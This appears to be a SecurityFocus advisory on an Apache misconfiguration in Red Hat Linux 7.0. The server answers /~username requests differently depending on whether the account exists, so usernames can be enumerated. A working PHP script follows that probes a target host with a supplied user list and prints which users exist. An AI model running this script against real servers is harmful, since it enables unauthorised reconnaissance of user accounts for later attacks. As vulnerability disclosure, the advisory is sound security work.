source: http://www.securityfocus.com/bid/3335/info

Versions of Apache webserver shipping with Red Hat Linux 7.0 (and possibly other Apache distributions) install with a default misconfiguration which could allow remote users to determine whether a give username exists on the vulnerable system.

http://www.example.com/~<username>

When a remote user makes a request for a possible user's default home page, the server returns one of three responses:

In a case where <username> is a valid user account, and has been configured with a homepage, the server responds with the user's homepage.

When <username> exists on the system, but has not been assigned a homepage document, the server returns the message "You don't have permission to access /~username on this server."

However, if the tested username does not exist as an account on the system, the Apache server's response includes the message "The requested URL /~username was not found on this server."

Because the server responds differently in the latter two cases, a remote user can test and enumerate possible usernames. Properly exploited, this information could be used in further attacks on the vulnerable hos

#!/usr/local/bin/php -q
<?
/*
default misconfiguration which could allow remote users
to determine whether a give username exists on the vulnerable system.

        By Gabriel A Maggiotti
 */


        if( $argc!=4)
        {
        echo "usagge: $argv[0] <host> <userlist> <delay>\n";
        return 1;
        }


$host=$argv[1];
$userlist=$argv[2];


$fd = fopen ($userlist, "r");
while (!feof ($fd)) {
        $user = fgets($fd, 4096);
                         
        $fp = fsockopen ($host, 80 , &$errno, &$errstr, 30);
        fputs ($fp, "GET /~$user HTTP/1.0\r\n\r\n");
        while (!feof ($fp)) {
                $sniff=fgets($fp,1024);
                if(strpos($sniff,"permission")!="") {
                        echo "$user exists!!!\n";
                        break;
                }
        }
        fclose ($fp);
        sleep(3);
}

fclose ($fd);

?>
